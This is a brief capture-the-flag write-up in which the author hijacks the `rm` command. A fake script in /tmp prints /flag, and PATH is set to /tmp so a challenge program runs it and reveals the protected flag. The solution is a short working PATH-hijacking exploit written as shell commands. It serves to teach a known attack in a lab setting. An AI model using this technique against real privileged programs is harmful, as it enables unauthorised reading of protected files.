### Challenge

To collect the flag by prevent the flag from being deleted by hijacking the `rm` command

### Thought Process

Firstly I'll have to create a fake `rm` script that reads and prints the flag instead of deleting it. Then I need to put `/tmp` at the beginning of `PATH` so that fake `rm` is found first

### Solution

```bash
~$ echo '#!/bin/bash' > /tmp/rm
~$ echo '/usr/bin/cat /flag' >> /tmp/rm
~$ /usr/bin/chmod +x /tmp/rm
~$ export PATH=/tmp
~$ /challenge/run
```
